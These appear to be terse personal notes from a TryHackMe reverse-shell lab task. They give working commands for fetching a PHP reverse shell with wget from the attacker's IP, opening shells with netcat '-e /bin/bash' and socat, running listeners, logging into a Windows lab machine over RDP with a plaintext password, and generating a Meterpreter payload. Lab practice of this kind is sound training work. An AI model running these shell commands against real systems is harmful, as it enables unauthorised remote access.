Task 14: 

ssh shell@10.10.178.88 -p 22

`Linux VM`

sudo python3 -m http.server 80 -> make a port listen

change ip in reverser shell -> to tun0 ip : 10.8.85.62

download reverse shell to `shell` machine : wget http://10.8.85.62/php-reverse-shell.php -> make a connect : nc 10.8.85.62 4444 -e /bin/bash

on other shell : nc -lvnp 4444 ( listen ) `TEST`

`run php reverse shell on shell machine` : php php-reverse-shell.php -> file need execute < chmod +x>

listen : nc -lvnp 1234 -> done to become root

`Socat ` : on shell machine : socat TCP:10.8.85.62:44444 EXEC:"bash -li",pty,stderr,sigint,setsid,sanePHP

other : `socat TCP-L:4444 -`


`Window VM`

using RDP connection : xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.59.169 /u:Administrator /p:'TryH4ckM3!'

download reverse shell on web : http://10.8.85.62

using `socat` : same with linux < different syntax >

using metaploit 
msfvenom : 
Create a 64bit Windows Meterpreter shell


